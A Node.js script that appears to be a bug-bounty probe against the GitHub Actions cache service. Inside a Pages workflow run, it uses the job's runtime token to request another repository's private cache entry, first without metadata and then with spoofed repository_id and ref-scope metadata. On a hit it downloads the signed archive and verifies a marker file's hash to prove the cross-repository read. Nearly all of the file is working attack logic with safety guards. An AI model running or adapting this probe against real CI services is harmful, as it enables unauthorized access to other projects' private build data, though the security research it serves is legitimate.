'use strict'

const crypto = require('crypto')
const zlib = require('zlib')

const BASELINE_CACHE_KEY = 'bbp-pages-public-cache-baseline-miss-20260918-r9-m7d4'
const DONOR_CACHE_KEY = 'bbp-pages-private-cache-20260918-c91e'
const DONOR_CACHE_VERSION = '9a41698a1c579c99c768ac86a2d875f88e262dafa9f57c8c1514bb2eb813a769'
const DONOR_REPOSITORY_ID = '1375281864'
const DONOR_REF = 'refs/heads/main'
const DONOR_ARCHIVE_BYTES = 336
const DONOR_MARKER_PATH_SUFFIX = 'cache-fixture/marker.txt'
const DONOR_MARKER_BYTES = 39
const DONOR_MARKER_SHA256 = '65adb69cd2e84ad41cd11b127a80e908d0cf5792abc5ad6d4b103d6cd9c6fce5'
const MAX_RESPONSE_BYTES = 1024 * 1024
const MAX_INFLATED_BYTES = 1024 * 1024
const SERVICE = 'github.actions.results.api.v1.CacheService'

function marker(name, level = 'notice') {
  process.stderr.write(`::${level}::${name}_20260918_R9_M7D4\n`)
}

function field(object, snakeName, camelName) {
  return object && (object[snakeName] ?? object[camelName])
}

function isCacheLookupBody(value) {
  return (
    value !== null &&
    typeof value === 'object' &&
    !Array.isArray(value) &&
    (!Object.prototype.hasOwnProperty.call(value, 'ok') || typeof value.ok === 'boolean')
  )
}

async function readBounded(response) {
  const declared = Number(response.headers.get('content-length') || 0)
  if (declared > MAX_RESPONSE_BYTES) throw new Error('response too large')
  if (!response.body) throw new Error('response body missing')

  const chunks = []
  let total = 0
  for await (const chunk of response.body) {
    const buffer = Buffer.from(chunk)
    total += buffer.length
    if (total > MAX_RESPONSE_BYTES) throw new Error('response too large')
    chunks.push(buffer)
  }
  return Buffer.concat(chunks)
}

async function postJson(origin, method, token, body) {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), 10000)
  try {
    const response = await fetch(new URL(`/twirp/${SERVICE}/${method}`, origin), {
      method: 'POST',
      headers: {
        accept: 'application/json',
        authorization: `Bearer ${token}`,
        'content-type': 'application/json'
      },
      body: JSON.stringify(body),
      redirect: 'error',
      signal: controller.signal
    })
    const raw = await readBounded(response)
    let parsed = null
    try {
      parsed = JSON.parse(raw.toString('utf8'))
    } catch (_) {
      parsed = null
    }
    return { status: response.status, body: parsed }
  } finally {
    clearTimeout(timer)
  }
}

function validateBlobUrl(value) {
  const url = new URL(value)
  if (
    url.protocol !== 'https:' ||
    !url.hostname.endsWith('.blob.core.windows.net') ||
    url.username !== '' ||
    url.password !== '' ||
    url.port !== ''
  ) {
    throw new Error('unexpected cache archive host')
  }
  return url
}

async function fetchCacheArchive(url) {
  const controller = new AbortController()
  const timer = setTimeout(() => controller.abort(), 10000)
  try {
    const response = await fetch(url, { redirect: 'error', signal: controller.signal })
    if (response.status !== 200) return { status: response.status, body: null }
    return { status: response.status, body: await readBounded(response) }
  } finally {
    clearTimeout(timer)
  }
}

function readTarString(buffer, start, length) {
  const end = buffer.indexOf(0, start)
  const boundedEnd = end === -1 || end > start + length ? start + length : end
  return buffer.subarray(start, boundedEnd).toString('utf8')
}

function parseTarSize(header) {
  const raw = readTarString(header, 124, 12).trim()
  if (!/^[0-7]+$/.test(raw)) throw new Error('unsupported tar size')
  const size = Number.parseInt(raw, 8)
  if (!Number.isSafeInteger(size) || size < 0 || size > MAX_INFLATED_BYTES) {
    throw new Error('invalid tar size')
  }
  return size
}

function countMatchingMarkerEntries(tarBuffer, pathSuffix, expectedBytes, expectedSha256) {
  let offset = 0
  let matches = 0

  while (offset + 512 <= tarBuffer.length) {
    const header = tarBuffer.subarray(offset, offset + 512)
    if (header.every(byte => byte === 0)) break

    const name = readTarString(header, 0, 100)
    const prefix = readTarString(header, 345, 155)
    const fullName = `${prefix ? `${prefix}/` : ''}${name}`
      .replace(/^\.\//, '')
      .replace(/^\//, '')
    const size = parseTarSize(header)
    const type = header[156]
    const dataStart = offset + 512
    const dataEnd = dataStart + size
    if (dataEnd > tarBuffer.length) throw new Error('truncated tar entry')

    const isRegularFile = type === 0 || type === 48
    const pathMatches = fullName === pathSuffix || fullName.endsWith(`/${pathSuffix}`)
    if (isRegularFile && pathMatches) {
      const data = tarBuffer.subarray(dataStart, dataEnd)
      const digest = crypto.createHash('sha256').update(data).digest('hex')
      if (data.length === expectedBytes && digest === expectedSha256) matches += 1
    }

    offset = dataStart + Math.ceil(size / 512) * 512
  }

  return matches
}

function classifyLookup(response) {
  if (response.status === 401 || response.status === 403) return 'denied'
  if (response.status === 400) return 'malformed'
  if (response.status !== 200 || !isCacheLookupBody(response.body)) return 'failed'
  return response.body.ok === true ? 'hit' : 'miss'
}

function donorRequest(metadata) {
  const request = {
    key: DONOR_CACHE_KEY,
    restore_keys: [],
    version: DONOR_CACHE_VERSION
  }
  if (metadata !== undefined) request.metadata = metadata
  return request
}

async function validateDonorHit(response, prefix) {
  const matchedKey = field(response.body, 'matched_key', 'matchedKey')
  const signedUrl = field(response.body, 'signed_download_url', 'signedDownloadUrl')
  if (matchedKey !== DONOR_CACHE_KEY || typeof signedUrl !== 'string' || signedUrl.length === 0) {
    marker(`${prefix}_METADATA_MISMATCH`, 'warning')
    return
  }
  marker(`${prefix}_METADATA_ACCEPTED`, 'warning')

  let archiveUrl
  try {
    archiveUrl = validateBlobUrl(signedUrl)
  } catch (_) {
    marker(`${prefix}_SIGNED_URL_REJECTED`)
    return
  }
  marker(`${prefix}_SIGNED_URL_ACCEPTED`, 'warning')

  const archiveResponse = await fetchCacheArchive(archiveUrl)
  if (archiveResponse.status !== 200 || !Buffer.isBuffer(archiveResponse.body)) {
    marker(`${prefix}_ARCHIVE_READ_REJECTED`)
    return
  }
  const archive = archiveResponse.body
  marker(`${prefix}_ARCHIVE_READ_ACCEPTED`, 'warning')
  if (archive.length !== DONOR_ARCHIVE_BYTES) {
    marker(`${prefix}_ARCHIVE_SIZE_MISMATCH`, 'warning')
    return
  }

  let tarBuffer
  try {
    tarBuffer = zlib.gunzipSync(archive, {maxOutputLength: MAX_INFLATED_BYTES})
  } catch (_) {
    marker(`${prefix}_ARCHIVE_FORMAT_MISMATCH`, 'warning')
    return
  }

  const matches = countMatchingMarkerEntries(
    tarBuffer,
    DONOR_MARKER_PATH_SUFFIX,
    DONOR_MARKER_BYTES,
    DONOR_MARKER_SHA256
  )
  if (matches === 1) {
    marker(`${prefix}_MARKER_CACHE_READ_ACCEPTED`, 'warning')
  } else {
    marker(`${prefix}_MARKER_HASH_MISMATCH`, 'warning')
  }
}

async function liveProbe() {
  if (process.env.PAGES_BBP_LIVE_CACHE_PROBE !== '1') {
    throw new Error('live guard missing')
  }
  if (
    process.env.GITHUB_RUN_NUMBER !== process.env.PAGES_BBP_EXPECTED_RUN ||
    process.env.GITHUB_RUN_ATTEMPT !== '1'
  ) {
    marker('PAGES_CACHE_ONE_SHOT_GUARD_MISS')
    return
  }

  let runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN || ''
  delete process.env.ACTIONS_RUNTIME_TOKEN
  const resultsUrl = new URL(process.env.ACTIONS_RESULTS_URL || '')
  if (
    resultsUrl.protocol !== 'https:' ||
    !resultsUrl.hostname.endsWith('.actions.githubusercontent.com') ||
    resultsUrl.username !== '' ||
    resultsUrl.password !== '' ||
    resultsUrl.port !== ''
  ) {
    throw new Error('unexpected cache service host')
  }

  const baseline = await postJson(resultsUrl.origin, 'GetCacheEntryDownloadURL', runtimeToken, {
    key: BASELINE_CACHE_KEY,
    restore_keys: [],
    version: DONOR_CACHE_VERSION
  })

  if (baseline.status === 401 || baseline.status === 403) {
    runtimeToken = ''
    marker('PAGES_CACHE_BASELINE_READ_DENIED')
    return
  }
  if (baseline.status !== 200 || !isCacheLookupBody(baseline.body)) {
    runtimeToken = ''
    marker('PAGES_CACHE_BASELINE_FAILED')
    return
  }
  if (baseline.body.ok === true) {
    runtimeToken = ''
    marker('PAGES_CACHE_BASELINE_UNEXPECTED_HIT', 'warning')
    return
  }
  marker('PAGES_CACHE_BASELINE_OK')

  const noMetadata = await postJson(
    resultsUrl.origin,
    'GetCacheEntryDownloadURL',
    runtimeToken,
    donorRequest()
  )
  const noMetadataOutcome = classifyLookup(noMetadata)
  if (noMetadataOutcome === 'hit') {
    runtimeToken = ''
    await validateDonorHit(noMetadata, 'PAGES_CACHE_NO_METADATA_CONTROL')
    return
  }
  if (noMetadataOutcome === 'failed' || noMetadataOutcome === 'malformed') {
    runtimeToken = ''
    marker('PAGES_CACHE_NO_METADATA_CONTROL_FAILED')
    return
  }
  marker('PAGES_CACHE_NO_METADATA_CONTROL_REJECTED')

  const repositoryMetadata = await postJson(
    resultsUrl.origin,
    'GetCacheEntryDownloadURL',
    runtimeToken,
    donorRequest({repository_id: DONOR_REPOSITORY_ID})
  )
  const repositoryMetadataOutcome = classifyLookup(repositoryMetadata)
  if (repositoryMetadataOutcome === 'hit') {
    runtimeToken = ''
    await validateDonorHit(repositoryMetadata, 'PAGES_CACHE_REPOSITORY')
    return
  }
  if (repositoryMetadataOutcome === 'failed') {
    runtimeToken = ''
    marker('PAGES_CACHE_REPOSITORY_METADATA_QUERY_FAILED')
    return
  }
  marker(
    repositoryMetadataOutcome === 'malformed'
      ? 'PAGES_CACHE_REPOSITORY_METADATA_MALFORMED'
      : 'PAGES_CACHE_REPOSITORY_METADATA_REJECTED'
  )

  const fullMetadata = await postJson(
    resultsUrl.origin,
    'GetCacheEntryDownloadURL',
    runtimeToken,
    donorRequest({
      repository_id: DONOR_REPOSITORY_ID,
      scope: [{scope: DONOR_REF, permission: '1'}]
    })
  )
  runtimeToken = ''
  const fullMetadataOutcome = classifyLookup(fullMetadata)
  if (fullMetadataOutcome === 'hit') {
    await validateDonorHit(fullMetadata, 'PAGES_CACHE_FULL')
    return
  }
  if (fullMetadataOutcome === 'failed') {
    marker('PAGES_CACHE_FULL_METADATA_QUERY_FAILED')
    return
  }
  marker(
    fullMetadataOutcome === 'malformed'
      ? 'PAGES_CACHE_FULL_METADATA_MALFORMED'
      : 'PAGES_CACHE_FULL_METADATA_REJECTED'
  )
  marker('PAGES_CACHE_METADATA_SPOOF_ALL_REJECTED')
}

function writeOctal(header, offset, length, value) {
  const encoded = `${value.toString(8).padStart(length - 1, '0')}\0`
  header.write(encoded, offset, length, 'ascii')
}

function selfTest() {
  if (
    !isCacheLookupBody({}) ||
    !isCacheLookupBody({ok: false}) ||
    !isCacheLookupBody({ok: true}) ||
    isCacheLookupBody({ok: 'false'}) ||
    isCacheLookupBody([]) ||
    isCacheLookupBody(null)
  ) {
    throw new Error('cache lookup response validator self-test failed')
  }

  if (
    classifyLookup({status: 401, body: {}}) !== 'denied' ||
    classifyLookup({status: 400, body: {}}) !== 'malformed' ||
    classifyLookup({status: 500, body: {}}) !== 'failed' ||
    classifyLookup({status: 200, body: {}}) !== 'miss' ||
    classifyLookup({status: 200, body: {ok: false}}) !== 'miss' ||
    classifyLookup({status: 200, body: {ok: true}}) !== 'hit' ||
    classifyLookup({status: 200, body: {ok: 'true'}}) !== 'failed'
  ) {
    throw new Error('cache lookup classifier self-test failed')
  }

  const plainRequest = donorRequest()
  const metadataRequest = donorRequest({repository_id: DONOR_REPOSITORY_ID})
  if (
    Object.prototype.hasOwnProperty.call(plainRequest, 'metadata') ||
    metadataRequest.metadata.repository_id !== DONOR_REPOSITORY_ID
  ) {
    throw new Error('cache metadata request self-test failed')
  }

  const data = Buffer.from('self-test-marker\n', 'utf8')
  const header = Buffer.alloc(512)
  header.write('cache-fixture/marker.txt', 0, 'utf8')
  writeOctal(header, 100, 8, 0o644)
  writeOctal(header, 108, 8, 0)
  writeOctal(header, 116, 8, 0)
  writeOctal(header, 124, 12, data.length)
  writeOctal(header, 136, 12, 0)
  header.fill(32, 148, 156)
  header[156] = 48
  header.write('ustar\0', 257, 'ascii')
  header.write('00', 263, 'ascii')
  const checksum = header.reduce((sum, byte) => sum + byte, 0)
  writeOctal(header, 148, 8, checksum)

  const padding = Buffer.alloc(Math.ceil(data.length / 512) * 512 - data.length)
  const tarBuffer = Buffer.concat([header, data, padding, Buffer.alloc(1024)])
  const archive = zlib.gzipSync(tarBuffer)
  const inflated = zlib.gunzipSync(archive, { maxOutputLength: MAX_INFLATED_BYTES })
  const digest = crypto.createHash('sha256').update(data).digest('hex')
  const matches = countMatchingMarkerEntries(
    inflated,
    'cache-fixture/marker.txt',
    data.length,
    digest
  )
  if (matches !== 1) throw new Error('tar marker parser self-test failed')
  process.stdout.write('SELF_TEST_OK\n')
}

if (process.argv.includes('--self-test')) {
  selfTest()
} else {
  liveProbe().catch(() => {
    marker('PAGES_CACHE_PROBE_ABORTED')
    process.exitCode = 1
  })
}
